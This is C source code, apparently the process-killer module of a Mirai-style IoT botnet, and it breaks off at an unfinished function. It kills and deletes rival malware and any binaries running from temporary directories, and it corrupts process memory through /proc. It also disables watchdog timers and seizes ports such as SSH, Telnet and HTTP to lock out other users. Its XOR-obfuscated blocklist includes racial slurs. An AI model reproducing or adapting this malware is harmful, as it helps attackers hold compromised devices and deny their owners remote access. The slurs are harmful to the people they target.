#define _GNU_SOURCE

#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <arpa/inet.h>
#include <linux/limits.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <dirent.h>
#include <signal.h>
#include <fcntl.h>
#include <time.h>
#include <string.h>
#include <ctype.h>
#include <errno.h>
#include <sys/wait.h>

#include "includes.h"
#include "killer.h"
#include "table.h"
#include "util.h"

static int killer_pid;
static char self_realpath[PATH_MAX] = {0};

static pid_t killed_pids[256];
static int killed_count = 0;

static BOOL has_exe_access(void);
static void port_bindings(void);
static BOOL memory_scan_match(char *);
static BOOL mem_exists(char *, int, char *, int);
static void read_proc_comm(pid_t, char *, int);

#define BL_KEY 0xBB

static const unsigned char bl_names[][32] = {
    { 0x03, 0xc3, 0x83, 0x8d },  /* x86 */
    { 0x06, 0xc3, 0x83, 0x8d, 0xe4, 0x8d, 0x8f },  /* x86_64 */
    { 0x04, 0xd2, 0x8d, 0x83, 0x8d },  /* i686 */
    { 0x04, 0xd2, 0x8e, 0x83, 0x8d },  /* i586 */
    { 0x04, 0xd6, 0xd2, 0xcb, 0xc8 },  /* mips */
    { 0x06, 0xd6, 0xd2, 0xcb, 0xc8, 0xde, 0xd7 },  /* mipsel */
    { 0x06, 0xd6, 0xd2, 0xcb, 0xc8, 0x8d, 0x8f },  /* mips64 */
    { 0x03, 0xda, 0xc9, 0xd6 },  /* arm */
    { 0x06, 0xda, 0xc9, 0xd6, 0xcd, 0x8f, 0xd7 },  /* armv4l */
    { 0x06, 0xda, 0xc9, 0xd6, 0xcd, 0x8e, 0xd7 },  /* armv5l */
    { 0x06, 0xda, 0xc9, 0xd6, 0xcd, 0x8d, 0xd7 },  /* armv6l */
    { 0x06, 0xda, 0xc9, 0xd6, 0xcd, 0x8c, 0xd7 },  /* armv7l */
    { 0x06, 0xda, 0xc9, 0xd6, 0xcd, 0x83, 0xd7 },  /* armv8l */
    { 0x07, 0xda, 0xda, 0xc9, 0xd8, 0xd3, 0x8d, 0x8f },  /* aarch64 */
    { 0x07, 0xcb, 0xd4, 0xcc, 0xde, 0xc9, 0xcb, 0xd8 },  /* powerpc */
    { 0x03, 0xcb, 0xcb, 0xd8 },  /* ppc */
    { 0x05, 0xc8, 0xcb, 0xda, 0xc9, 0xd8 },  /* sparc */
    { 0x03, 0xc8, 0xd3, 0x8f },  /* sh4 */
    { 0x04, 0xd6, 0x8d, 0x83, 0xd0 },  /* m68k */
    { 0x06, 0xd9, 0xd4, 0xcf, 0xd5, 0xde, 0xcf },  /* botnet */
    { 0x07, 0xd9, 0xd4, 0xda, 0xcf, 0xd5, 0xde, 0xcf },  /* boatnet */
    { 0x05, 0xd6, 0xda, 0xd5, 0xd1, 0xd2 },  /* manji */
    { 0x05, 0xd6, 0xd2, 0xc9, 0xda, 0xd2 },  /* mirai */
    { 0x05, 0xd8, 0xd4, 0xd5, 0xdf, 0xd2 },  /* condi */
    { 0x03, 0xd1, 0xde, 0xcc },  /* jew */
    { 0x06, 0xd5, 0xd2, 0xdc, 0xdc, 0xde, 0xc9 },  /* nigger */
    { 0x05, 0xd5, 0xd2, 0xdc, 0xdc, 0xda },  /* nigga */
    { 0x07, 0xcf, 0xc8, 0xce, 0xd5, 0xda, 0xd6, 0xd2 },  /* tsunami */
    { 0x04, 0xc8, 0xd4, 0xc9, 0xda },  /* sora */
    { 0x05, 0xd4, 0xcc, 0xda, 0xc9, 0xd2 },  /* owari */
    { 0x05, 0xd1, 0xd4, 0xc8, 0xd3, 0xd4 },  /* josho */
    { 0x06, 0xda, 0xcb, 0xd4, 0xd7, 0xd7, 0xd4 },  /* apollo */
    { 0x06, 0xd6, 0xda, 0xc8, 0xce, 0xcf, 0xda },  /* masuta */
    { 0x04, 0xcd, 0xda, 0xd6, 0xcb },  /* vamp */
    { 0x04, 0xca, 0xd9, 0xd4, 0xcf },  /* qbot */
    { 0x06, 0xc8, 0xd3, 0xd2, 0xd5, 0xcf, 0xd4 },  /* shinto */
    { 0x04, 0xd4, 0xd6, 0xd5, 0xd2 },  /* omni */
    { 0x04, 0xd0, 0xc2, 0xc9, 0xda },  /* kyra */
    { 0x03, 0xc9, 0xde, 0xd6 },  /* rem */
    { 0x07, 0xd6, 0xda, 0xd7, 0xcc, 0xda, 0xc9, 0xde },  /* malware */
    { 0x07, 0xc9, 0xd4, 0xd4, 0xcf, 0xd0, 0xd2, 0xcf },  /* rootkit */
    { 0x08, 0xd9, 0xda, 0xd8, 0xd0, 0xdf, 0xd4, 0xd4, 0xc9 },  /* backdoor */
    { 0x07, 0xde, 0xc3, 0xcb, 0xd7, 0xd4, 0xd2, 0xcf },  /* exploit */
    { 0x07, 0xcb, 0xda, 0xc2, 0xd7, 0xd4, 0xda, 0xdf },  /* payload */
    { 0x06, 0xd2, 0xd5, 0xd1, 0xde, 0xd8, 0xcf },  /* inject */
    { 0x03, 0xc3, 0xd6, 0xc9 },  /* xmr */
    { 0x05, 0xd6, 0xd2, 0xd5, 0xde, 0xc9 },  /* miner */
    { 0x0b, 0xd8, 0xc9, 0xc2, 0xcb, 0xcf, 0xd4, 0xd5, 0xd2, 0xdc, 0xd3, 0xcf },  /* cryptonight */
};

static void bl_deobf(const unsigned char *obf, char *out, int max)
{
    int i, len = obf[0];
    if (len > max - 1) len = max - 1;
    for (i = 0; i < len; i++)
        out[i] = (char)(obf[i + 1] ^ BL_KEY);
    out[len] = 0;
}

static void kill_with_escalation(pid_t pid)
{
    char oom_path[64];
    char mem_path[64];
    int oom_fd, mem_fd;
    if (pid <= 1) return;

    /* Method 1: freeze + polite terminate */
    kill(pid, SIGSTOP);
    usleep(10000);
    kill(pid, SIGTERM);
    usleep(50000);
    if (kill(pid, 0) != 0) return;

    /* Method 2: SIGKILL */
    kill(pid, SIGKILL);
    usleep(50000);
    if (kill(pid, 0) != 0) return;

    /* Method 3: abort signal + SIGKILL */
    kill(pid, SIGABRT);
    usleep(20000);
    kill(pid, SIGKILL);
    usleep(50000);
    if (kill(pid, 0) != 0) return;

    /* Method 4: segmentation fault to crash it */
    kill(pid, SIGSEGV);
    usleep(30000);
    kill(pid, SIGKILL);
    usleep(50000);
    if (kill(pid, 0) != 0) return;

    /* Method 5: bus error + SIGKILL */
    kill(pid, SIGBUS);
    usleep(20000);
    kill(pid, SIGKILL);
    usleep(50000);
    if (kill(pid, 0) != 0) return;

    /* Method 6: OOM trigger — max out OOM score so kernel kills it */
    snprintf(oom_path, sizeof(oom_path), "/proc/%d/oom_score_adj", (int)pid);
    oom_fd = open(oom_path, O_WRONLY);
    if (oom_fd != -1)
    {
        write(oom_fd, "1000", 4);
        close(oom_fd);
    }
    usleep(80000);
    if (kill(pid, 0) != 0) return;

    /* Method 7: FPE + SIGKILL */
    kill(pid, SIGFPE);
    usleep(20000);
    kill(pid, SIGKILL);
    usleep(50000);
    if (kill(pid, 0) != 0) return;

    /* Method 8: illegal instruction to break execution flow */
    kill(pid, SIGILL);
    usleep(20000);
    kill(pid, SIGKILL);
    usleep(50000);
    if (kill(pid, 0) != 0) return;

    /* Method 9: corrupt process memory via /proc/<pid>/mem */
    snprintf(mem_path, sizeof(mem_path), "/proc/%d/mem", (int)pid);
    mem_fd = open(mem_path, O_WRONLY);
    if (mem_fd != -1)
    {
        lseek(mem_fd, 0x400000, SEEK_SET);
        write(mem_fd, "\xCC\xCC\xCC\xCC\xCC\xCC\xCC\xCC", 8);
        write(mem_fd, "\x00\x00\x00\x00\x00\x00\x00\x00", 8);
        close(mem_fd);
    }
    usleep(50000);
    if (kill(pid, 0) != 0) return;

    /* Method 10: SIGXCPU + SIGKILL */
    kill(pid, SIGXCPU);
    usleep(20000);
    kill(pid, SIGKILL);
    usleep(50000);
    if (kill(pid, 0) != 0) return;

    /* Method 11: SIGSYS (bad syscall) */
    kill(pid, SIGSYS);
    usleep(20000);
    kill(pid, SIGKILL);
    usleep(50000);
    if (kill(pid, 0) != 0) return;

    /* Method 12: SIGPIPE to break I/O */
    kill(pid, SIGPIPE);
    usleep(10000);
    kill(pid, SIGCONT);
    usleep(10000);
    kill(pid, SIGKILL);
    usleep(50000);
    if (kill(pid, 0) != 0) return;

    /* Method 13: relentless SIGKILL burst with verification */
    {
        int kt;
        for (kt = 0; kt < 50; kt++)
        {
            kill(pid, SIGKILL);
            usleep(1000);
            if (kill(pid, 0) != 0) return;
        }
    }

    /* Method 14: SIGCONT then all fatal signals */
    kill(pid, SIGCONT);
    usleep(5000);
    kill(pid, SIGKILL);
    kill(pid, SIGTERM);
    kill(pid, SIGABRT);
    kill(pid, SIGKILL);
}

static void truncate_binary(const char *path)
{
    int fd;
    if (!path || path[0] == 0) return;
    fd = open(path, O_WRONLY | O_TRUNC);
    if (fd != -1) close(fd);
    unlink(path);
}

static void kill_process_tree(pid_t parent_pid)
{
    DIR *d;
    struct dirent *e;
    char p[64], *ptr = p;
    char buf[512];
    int fd;
    ssize_t n;

    table_unlock_val(TABLE_KILLER_PROC);
    ptr += util_strcpy(ptr, table_retrieve_val(TABLE_KILLER_PROC, NULL));
    table_lock_val(TABLE_KILLER_PROC);

    d = opendir(p);
    if (!d) return;

    while ((e = readdir(d)))
    {
        char sp[64], *sptr = sp;
        char *after;
        pid_t ppid = 0;

        if (*(e->d_name) < '0' || *(e->d_name) > '9')
            continue;

        table_unlock_val(TABLE_KILLER_PROC);
        table_unlock_val(TABLE_KILLER_STAT);
        sptr += util_strcpy(sptr, table_retrieve_val(TABLE_KILLER_PROC, NULL));
        sptr += util_strcpy(sptr, e->d_name);
        sptr += util_strcpy(sptr, table_retrieve_val(TABLE_KILLER_STAT, NULL));
        table_lock_val(TABLE_KILLER_PROC);
        table_lock_val(TABLE_KILLER_STAT);

        fd = open(sp, O_RDONLY);
        if (fd < 0) continue;
        n = read(fd, buf, sizeof(buf) - 1);
        close(fd);
        if (n <= 0) continue;
        buf[n] = 0;
        after = strrchr(buf, ')');
        if (!after) continue;
        after++;
        sscanf(after, " %*c %d", &ppid);
        if (ppid == parent_pid)
            kill_with_escalation(util_atoi(e->d_name, 10));
    }
    closedir(d);
}

static void kill_with_tree(pid_t pid)
{
    kill_with_escalation(pid);
    kill_process_tree(pid);
}

static void watchdog_kill(void)
{
    static const char *devs[] = {
        "/dev/watchdog",
        "/dev/misc/watchdog",
        "/dev/FTWDT101_watchdog"
    };
    int i, fd;
    for (i = 0; i < 3; i++)
    {
        fd = open(devs[i], O_RDWR);
        if (fd == -1)
            fd = open(devs[i], O_WRONLY);
        if (fd != -1)
        {
            write(fd, "V", 1);
            close(fd);
        }
    }
}

static void busybox_kill(pid_t pid)
{
    pid_t c;
    char pid_str[16];
    util_itoa(pid, 10, pid_str);

    c = fork();
    if (c == 0)
    {
        int null_fd;
        table_unlock_val(TABLE_KILLER_DEVNULL);
        null_fd = open(table_retrieve_val(TABLE_KILLER_DEVNULL, NULL), O_RDWR);
        table_lock_val(TABLE_KILLER_DEVNULL);
        if (null_fd != -1)
        {
            dup2(null_fd, 0);
            dup2(null_fd, 1);
            dup2(null_fd, 2);
            if (null_fd > 2) close(null_fd);
        }
        table_unlock_val(TABLE_KILLER_BUSYBOX);
        execl(table_retrieve_val(TABLE_KILLER_BUSYBOX, NULL), "busybox", "kill", "-9", pid_str, NULL);
        table_lock_val(TABLE_KILLER_BUSYBOX);
        _exit(0);
    }
    else if (c > 0)
    {
        waitpid(c, NULL, WNOHANG);
    }
}

static BOOL is_killed(pid_t pid)
{
    int i;
    for (i = 0; i < killed_count; i++)
        if (killed_pids[i] == pid) return TRUE;
    return FALSE;
}

static void add_killed(pid_t pid)
{
    if (killed_count < 256)
    {
        killed_pids[killed_count++] = pid;
    }
    else
    {
        util_memmove(killed_pids, killed_pids + 1, 255 * sizeof(pid_t));
        killed_pids[255] = pid;
    }
}

static void kill_and_truncate(pid_t pid, const char *exe_path)
{
    kill_with_tree(pid);
    busybox_kill(pid);
    if (exe_path && exe_path[0])
        truncate_binary(exe_path);

    /* Verify process is actually dead before marking */
    if (kill(pid, 0) == 0)
    {
        int i;
        for (i = 0; i < 20; i++)
        {
            kill(pid, SIGKILL);
            usleep(2000);
            if (kill(pid, 0) != 0) break;
        }
    }

    if (kill(pid, 0) != 0)
        add_killed(pid);
}

static BOOL is_whitelisted_path(const char *path)
{
    int len = util_strlen(path);
    if (len < 1) return FALSE;
    if (util_strcmp(path, self_realpath)) return TRUE;
    if (len >= 4 && util_strncmp(path, "/bin", 4)) return TRUE;
    if (len >= 5 && util_strncmp(path, "/sbin", 5)) return TRUE;
    if (len >= 4 && util_strncmp(path, "/usr", 4)) return TRUE;
    if (len >= 4 && util_strncmp(path, "/lib", 4)) return TRUE;
    if (len >= 4 && util_strncmp(path, "/etc", 4)) return TRUE;
    if (len >= 5 && util_strncmp(path, "/proc", 5)) return TRUE;
    if (len >= 4 && util_strncmp(path, "/sys", 4)) return TRUE;
    if (len >= 4 && util_strncmp(path, "/dev", 4)) return TRUE;
    return FALSE;
}

static BOOL is_suspicious_path(const char *path)
{
    int len;
    if (path[0] == 0) return FALSE;
    len = util_strlen(path);
    if (len >= 4 && util_strncmp(path, "/tmp", 4)) return TRUE;
    if (len >= 8 && util_strncmp(path, "/var/tmp", 8)) return TRUE;
    if (len >= 8 && util_strncmp(path, "/dev/shm", 8)) return TRUE;
    if (len >= 8 && util_strncmp(path, "/var/run", 8)) return TRUE;
    if (len >= 5 && util_strncmp(path, "/run/", 5)) return TRUE;
    if (len >= 15 && util_strncmp(path, "/data/local/tmp", 15)) return TRUE;
    if (len >= 4 && util_strncmp(path, "/mnt", 4)) return TRUE;
    if (len >= 5 && util_strncmp(path, "/root", 5)) return TRUE;
    if (len >= 4 && util_strncmp(path, "/opt", 4)) return TRUE;
    if (len >= 5 && util_strncmp(path, "/home", 5)) return TRUE;
    if (len >= 10 && util_strncmp(path, "/var/spool", 10)) return TRUE;
    if (len >= 4 && util_strncmp(path, "/var", 4) && util_strstr((char *)path, "/tmp")) return TRUE;
    if (util_strstr((char *)path, "/.")) return TRUE;
    return FALSE;
}

static BOOL is_kill_zone(const char *path)
{
    if (path[0] == 0) return FALSE;
    if (util_strncmp(path, "/tmp/", 5)) return TRUE;
    if (util_strncmp(path, "/var/tmp/", 9)) return TRUE;
    if (util_strncmp(path, "/dev/shm/", 9)) return TRUE;
    if (util_strncmp(path, "/var/run/", 9)) return TRUE;
    if (util_strncmp(path, "/run/", 5)) return TRUE;
    if (util_strncmp(path, "/data/local/tmp/", 16)) return TRUE;
    if (util_strncmp(path, "/mnt/", 5)) return TRUE;
    if (util_strncmp(path, "/root/", 6)) return TRUE;
    if (util_strstr((char *)path, "/.")) return TRUE;
    return FALSE;
}

static void read_proc_exe(pid_t pid, char *out, int max)
{
    char p[96], *ptr = p;
    int r;
    table_unlock_val(TABLE_KILLER_PROC);
    table_unlock_val(TABLE_KILLER_EXE);
    ptr += util_strcpy(ptr, table_retrieve_val(TABLE_KILLER_PROC, NULL));
    ptr += util_strcpy(ptr, util_itoa(pid, 10, p + 80));
    ptr += util_strcpy(ptr, table_retrieve_val(TABLE_KILLER_EXE, NULL));
    table_lock_val(TABLE_KILLER_PROC);
    table_lock_val(TABLE_KILLER_EXE);
    r = readlink(p, out, max - 1);
    if (r < 0) { out[0] = 0; return; }
    out[r] = 0;
}

static void read_proc_comm(pid_t pid, char *out, int max)
{
    char p[96], *ptr = p;
    int fd, n;
    table_unlock_val(TABLE_KILLER_PROC);
    table_unlock_val(TABLE_KILLER_COMM);
    ptr += util_strcpy(ptr, table_retrieve_val(TABLE_KILLER_PROC, NULL));
    ptr += util_strcpy(ptr, util_itoa(pid, 10, p + 80));
    ptr += util_strcpy(ptr, table_retrieve_val(TABLE_KILLER_COMM, NULL));
    table_lock_val(TABLE_KILLER_PROC);
    table_lock_val(TABLE_KILLER_COMM);
    fd = open(p, O_RDONLY);
    if (fd < 0) { out[0] = 0; return; }
    n = read(fd, out, max - 1);
    close(fd);
    if (n <= 0) { out[0] = 0; return; }
    out[n] = 0;
    {
        char *nl = strchr(out, '\n');
        if (nl) *nl = 0;
    }
}

static void scan_anime_exe(DIR *dir, struct dirent *file)
{
    char exe_path[64], *ptr = exe_path;
    char realpath[PATH_MAX];
    int rp_len;
    pid_t pid = util_atoi(file->d_name, 10);

    table_unlock_val(TABLE_KILLER_PROC);
    table_unlock_val(TABLE_KILLER_EXE);
    ptr += util_strcpy(ptr, table_retrieve_val(TABLE_KILLER_PROC, NULL));
    ptr += util_strcpy(ptr, file->d_name);
    ptr += util_strcpy(ptr, table_retrieve_val(TABLE_KILLER_EXE, NULL));
    table_lock_val(TABLE_KILLER_PROC);
    table_lock_val(TABLE_KILLER_EXE);

    if ((rp_len = readlink(exe_path, realpath, sizeof(realpath) - 1)) != -1)
    {
        realpath[rp_len] = 0;

        table_unlock_val(TABLE_KILLER_ANIME);
        if (util_stristr(realpath, rp_len, table_retrieve_val(TABLE_KILLER_ANIME, NULL)) != -1)
        {
            table_lock_val(TABLE_KILLER_ANIME);
            kill_and_truncate(pid, realpath);
            return;
        }
        table_lock_val(TABLE_KILLER_ANIME);

        if (util_strcmp(realpath, self_realpath))
            return;

        {
            int fd = open(realpath, O_RDONLY);
            if (fd == -1)
            {
                kill_and_truncate(pid, realpath);
                return;
            }
            close(fd);
        }
    }
}

static void scan_memory_maps(DIR *dir, struct dirent *file)
{
    char maps_path[64], *ptr2 = maps_path;
    pid_t pid = util_atoi(file->d_name, 10);

    table_unlock_val(TABLE_KILLER_PROC);
    table_unlock_val(TABLE_KILLER_MAPS);
    ptr2 += util_strcpy(ptr2, table_retrieve_val(TABLE_KILLER_PROC, NULL));
    ptr2 += util_strcpy(ptr2, file->d_name);
    ptr2 += util_strcpy(ptr2, table_retrieve_val(TABLE_KILLER_MAPS, NULL));
    table_lock_val(TABLE_KILLER_PROC);
    table_lock_val(TABLE_KILLER_MAPS);

    if (memory_scan_match(maps_path))
    {
        char exe_path[PATH_MAX];
        read_proc_exe(pid, exe_path, sizeof(exe_path));
        kill_and_truncate(pid, exe_path);
    }
}

static void scan_cmdline(pid_t pid)
{
    char path[64], *ptr = path;
    char buf[2048];
    int fd, n;

    table_unlock_val(TABLE_KILLER_PROC);
    ptr += util_strcpy(ptr, table_retrieve_val(TABLE_KILLER_PROC, NULL));
    ptr += util_strcpy(ptr, util_itoa(pid, 10, path + 32));
    util_strcpy(ptr, "/cmdline");
    table_lock_val(TABLE_KILLER_PROC);

    fd = open(path, O_RDONLY);
    if (fd < 0) return;
    n = read(fd, buf, sizeof(buf) - 1);
    close(fd);
    if (n <= 0) return;
    buf[n] = 0;

    /* Replace null separators with spaces for string matching */
    {
        int ci;
        for (ci = 0; ci < n - 1; ci++)
            if (buf[ci] == 0) buf[ci] = ' ';
    }

    /* Kill if cmdline references anything in a kill zone */
    if (util_strstr(buf, "/tmp/") || util_strstr(buf, "/var/tmp/") ||
        util_strstr(buf, "/dev/shm/") || util_strstr(buf, "/mnt/") ||
        util_strstr(buf, "/root/") || util_strstr(buf, "/data/local/tmp/") ||
        util_strstr(buf, "/var/run/") || util_strstr(buf, "/run/") ||
        util_strstr(buf, "/home/") || util_strstr(buf, "/opt/") ||
        util_strstr(buf, "/."))
    {
        char exe_path[PATH_MAX];
        read_proc_exe(pid, exe_path, sizeof(exe_path));
        kill_and_truncate(pid, exe_path);
        return;
    }

    /* Kill if cmdline contains known malware names */
    {
        int i;
        for (i = 0; i < (int)(sizeof(bl_names) / sizeof(bl_names[0])); i++)
        {
            char deobf[32];
            bl_deobf(bl_names[i], deobf, sizeof(deobf));
            if (util_strstr(buf, deobf))
            {
                char exe_path[PATH_MAX];
                read_proc_exe(pid, exe_path, sizeof(exe_path));
                kill_and_truncate(pid, exe_path);
                return;
            }
        }
    }
}

static void scan_proc_blacklist(struct dirent *file)
{
    pid_t pid = util_atoi(file->d_name, 10);
    char comm[64];
    char exe_path[PATH_MAX];
    int i;

    read_proc_comm(pid, comm, sizeof(comm));
    if (comm[0] == 0) return;

    {
        char self_pid[16];
        util_itoa(getpid(), 10, self_pid);
        if (util_strcmp(comm, self_pid)) return;
    }

    read_proc_exe(pid, exe_path, sizeof(exe_path));
    if (is_whitelisted_path(exe_path)) return;

    for (i = 0; i < (int)(sizeof(bl_names) / sizeof(bl_names[0])); i++)
    {
        char deobf[32];
        bl_deobf(bl_names[i], deobf, sizeof(deobf));
        if (util_strstr(comm, deobf) || util_strstr(exe_path, deobf))
        {
            kill_and_truncate(pid, exe_path);
            return;
        }
    }

    if (is_suspicious_path(exe_path))
    {
        kill_and_truncate(pid, exe_path);
        return;
    }

    if (is_kill_zone(exe_path))
    {
        kill_and_truncate(pid, exe_path);
        return;
    }
}

static void scan_proc_fd(pid_t pid)
{
    char fd_dir[64], *ptr = fd_dir;
    char fd_path[128];
    char link_buf[PATH_MAX];
    DIR *d;
    struct dirent *e;
    int rp_len;

    table_unlock_val(TABLE_KILLER_PROC);
    table_unlock_val(TABLE_KILLER_FD);
    ptr += util_strcpy(ptr, table_retrieve_val(TABLE_KILLER_PROC, NULL));
    ptr += util_strcpy(ptr, util_itoa(pid, 10, fd_dir + 32));
    ptr += util_strcpy(ptr, table_retrieve_val(TABLE_KILLER_FD, NULL));
    table_lock_val(TABLE_KILLER_PROC);
    table_lock_val(TABLE_KILLER_FD);

    d = opendir(fd_dir);
    if (!d) return;

    while ((e = readdir(d)))
    {
        if (e->d_name[0] == '.') continue;
        util_strcpy(fd_path, fd_dir);
        util_strcpy(fd_path + util_strlen(fd_path), "/");
        util_strcpy(fd_path + util_strlen(fd_path), e->d_name);

        rp_len = readlink(fd_path, link_buf, sizeof(link_buf) - 1);
        if (rp_len <= 0) continue;
        link_buf[rp_len] = 0;

        if (is_kill_zone(link_buf))
        {
            char exe[PATH_MAX];
            read_proc_exe(pid, exe, sizeof(exe));
            kill_and_truncate(pid, exe);
            closedir(d);
            return;
        }
    }
    closedir(d);
}

static void scan_kill_zones(void)
{
    static const char *kill_dirs[] = {
        "/tmp", "/var/tmp", "/dev/shm", "/var/run",
        "/data/local/tmp", "/mnt", "/root",
        NULL
    };
    int di;
    for (di = 0; kill_dirs[di]; di++)
    {
        DIR *d = opendir(kill_dirs[di]);
        struct dirent *e;
        if (!d) continue;
        while ((e = readdir(d)))
        {
            if (e->d_name[0] == '.') continue;
            {
                char full[PATH_MAX];
                struct stat st;
                util_strcpy(full, kill_dirs[di]);
                full[util_strlen(full)] = '/';
                util_strcpy(full + util_strlen(full), e->d_name);

                if (lstat(full, &st) == 0 && S_ISREG(st.st_mode) && (st.st_mode & 0111))
                {
                    DIR *pd;
                    struct dirent *pe;
                    table_unlock_val(TABLE_KILLER_PROC);
                    pd = opendir(table_retrieve_val(TABLE_KILLER_PROC, NULL));
                    table_lock_val(TABLE_KILLER_PROC);
                    if (pd)
                    {
                        while ((pe = readdir(pd)))
                        {
                            pid_t ppid;
                            char exe_path[PATH_MAX];
                            if (pe->d_name[0] < '0' || pe->d_name[0] > '9') continue;
                            ppid = util_atoi(pe->d_name, 10);
                            if (ppid == getpid() || ppid == getppid()) continue;
                            read_proc_exe(ppid, exe_path, sizeof(exe_path));
                            if (exe_path[0] != 0 && util_strcmp(exe_path, full))
                            {
                                kill_and_truncate(ppid, exe_path);
                            }
                        }
                        closedir(pd);
                    }
                }
            }
        }
        closedir(d);
    }
}

void killer_init(void)
{
    killer_pid = fork();
    if (killer_pid > 0 || killer_pid == -1)
        return;

    sleep(5);

    if (!has_exe_access())
        return;

    port_bindings();
    watchdog_kill();

    while (TRUE)
    {
        DIR *dir;
        struct dirent *file;
        int killer_highest_pid = KILLER_MIN_PID;
        time_t last_pid_scan = time(NULL);
        uint32_t scan_counter = 0;
        static int zone_scan_counter = 0;

        table_unlock_val(TABLE_KILLER_PROC);
        dir = opendir(table_retrieve_val(TABLE_KILLER_PROC, NULL));
        table_lock_val(TABLE_KILLER_PROC);

        if (dir == NULL)
            break;

        while ((file = readdir(dir)) != NULL)
        {
            pid_t pid;

            if (*(file->d_name) < '0' || *(file->d_name) > '9')
                continue;

            pid = util_atoi(file->d_name, 10);
            scan_counter++;

            if (pid <= killer_highest_pid)
            {
                if (time(NULL) - last_pid_scan > KILLER_RESTART_SCAN_TIME)
                    killer_highest_pid = KILLER_MIN_PID;
                else if (pid > KILLER_MIN_PID && scan_counter % 10 == 0)
                    sleep(1);
                continue;
            }

            if (pid > killer_highest_pid)
                killer_highest_pid = pid;
            last_pid_scan = time(NULL);

            if (pid == getpid() || pid == getppid() || pid <= 1)
                continue;

            if (is_killed(pid))
                continue;

            scan_anime_exe(dir, file);

            scan_memory_maps(dir, file);

            scan_proc_blacklist(file);

            scan_cmdline(pid);

            scan_proc_fd(pid);
        }

        closedir(dir);

        if (++zone_scan_counter >= 5)
        {
            zone_scan_counter = 0;
            scan_kill_zones();
        }

        {
            int ms = 1500 + (rand() % 1500);
            usleep(ms * 1000);
        }
    }
}

void killer_kill(void)
{
    kill(killer_pid, 9);
}

BOOL killer_kill_by_port(port_t port)
{
    DIR *dir, *fd_dir;
    struct dirent *entry, *fd_entry;
    char path[PATH_MAX] = {0}, exe[PATH_MAX] = {0}, buffer[513] = {0};
    int fd = 0;
    char inode[16] = {0};
    char *ptr_path = path;
    int ret = 0;
    char port_str[16];

    util_itoa(ntohs(port), 16, port_str);
    if (util_strlen(port_str) == 2)
    {
        port_str[2] = port_str[0];
        port_str[3] = port_str[1];
        port_str[4] = 0;
        port_str[0] = '0';
        port_str[1] = '0';
    }

    table_unlock_val(TABLE_KILLER_PROC);
    table_unlock_val(TABLE_KILLER_EXE);
    table_unlock_val(TABLE_KILLER_FD);
    table_unlock_val(TABLE_KILLER_TCP);

    fd = open(table_retrieve_val(TABLE_KILLER_TCP, NULL), O_RDONLY);
    if (fd == -1)
        return 0;

    while (util_fdgets(buffer, 512, fd) != NULL)
    {
        int i = 0, ii = 0;
        while (buffer[i] != 0 && buffer[i] != ':') i++;
        if (buffer[i] == 0) continue;
        i += 2;
        ii = i;
        while (buffer[i] != 0 && buffer[i] != ' ') i++;
        buffer[i++] = 0;

        if (util_stristr(&(buffer[ii]), util_strlen(&(buffer[ii])), port_str) != -1)
        {
            int column_index = 0;
            BOOL in_column = FALSE;
            BOOL listening_state = FALSE;

            while (column_index < 7 && buffer[++i] != 0)
            {
                if (buffer[i] == ' ' || buffer[i] == '\t')
                    in_column = TRUE;
                else
                {
                    if (in_column == TRUE)
                        column_index++;
                    if (in_column == TRUE && column_index == 1 && buffer[i + 1] == 'A')
                        listening_state = TRUE;
                    in_column = FALSE;
                }
            }
            ii = i;
            if (!listening_state) continue;
            while (buffer[i] != 0 && buffer[i] != ' ') i++;
            buffer[i++] = 0;
            if (util_strlen(&(buffer[ii])) > 15) continue;
            util_strcpy(inode, &(buffer[ii]));
            break;
        }
    }
    close(fd);

    if (util_strlen(inode) == 0)
    {
        table_lock_val(TABLE_KILLER_PROC);
        table_lock_val(TABLE_KILLER_EXE);
        table_lock_val(TABLE_KILLER_FD);
        table_lock_val(TABLE_KILLER_TCP);
        return 0;
    }

    table_unlock_val(TABLE_KILLER_PROC);
    if ((dir = opendir(table_retrieve_val(TABLE_KILLER_PROC, NULL))) != NULL)
    {
        while ((entry = readdir(dir)) != NULL && ret == 0)
        {
            char *pid = entry->d_name;
            if (*pid < '0' || *pid > '9') continue;

            util_strcpy(ptr_path, table_retrieve_val(TABLE_KILLER_PROC, NULL));
            util_strcpy(ptr_path + util_strlen(ptr_path), pid);
            util_strcpy(ptr_path + util_strlen(ptr_path), table_retrieve_val(TABLE_KILLER_EXE, NULL));
            if (readlink(path, exe, PATH_MAX) == -1) continue;

            util_strcpy(ptr_path, table_retrieve_val(TABLE_KILLER_PROC, NULL));
            util_strcpy(ptr_path + util_strlen(ptr_path), pid);
            util_strcpy(ptr_path + util_strlen(ptr_path), table_retrieve_val(TABLE_KILLER_FD, NULL));
            if ((fd_dir = opendir(path)) != NULL)
            {
                while ((fd_entry = readdir(fd_dir)) != NULL && ret == 0)
                {
                    char *fd_str = fd_entry->d_name;
                    util_zero(exe, PATH_MAX);
                    util_strcpy(ptr_path, table_retrieve_val(TABLE_KILLER_PROC, NULL));
                    util_strcpy(ptr_path + util_strlen(ptr_path), pid);
                    util_strcpy(ptr_path + util_strlen(ptr_path), table_retrieve_val(TABLE_KILLER_FD, NULL));
                    util_strcpy(ptr_path + util_strlen(ptr_path), "/");
                    util_strcpy(ptr_path + util_strlen(ptr_path), fd_str);
                    if (readlink(path, exe, PATH_MAX) == -1) continue;
                    if (util_stristr(exe, util_strlen(exe), inode) != -1)
                    {
                        kill_with_escalation(util_atoi(pid, 10));
                        ret = 1;
                    }
                }
                closedir(fd_dir);
            }
        }
        closedir(dir);
    }
    table_lock_val(TABLE_KILLER_PROC);

    sleep(1);

    table_lock_val(TABLE_KILLER_PROC);
    table_lock_val(TABLE_KILLER_EXE);
    table_lock_val(TABLE_KILLER_FD);
    table_lock_val(TABLE_KILLER_TCP);

    return ret;
}

static void port_bindings(void)
{
    struct sockaddr_in addr;
    int fd;
    port_t ports[] = {22, 23, 25, 53, 80, 81, 443, 444, 1337, 1338, 1991,
        4321, 5555, 6666, 6667, 6697, 7777, 8080, 8443, 8888, 9009,
        9999, 23231, 37215, 48101, 52869, 53413};
    int i;

    addr.sin_family = AF_INET;
    addr.sin_addr.s_addr = INADDR_ANY;

    for (i = 0; i < sizeof(ports) / sizeof(ports[0]); i++)
    {
        killer_kill_by_port(htons(ports[i]));
        addr.sin_port = htons(ports[i]);
        fd = socket(AF_INET, SOCK_STREAM, 0);
        if (fd != -1)
        {
            bind(fd, (struct sockaddr *)&addr, sizeof(addr));
            listen(fd, 1);
        }
    }
}

static BOOL has_exe_access(void)
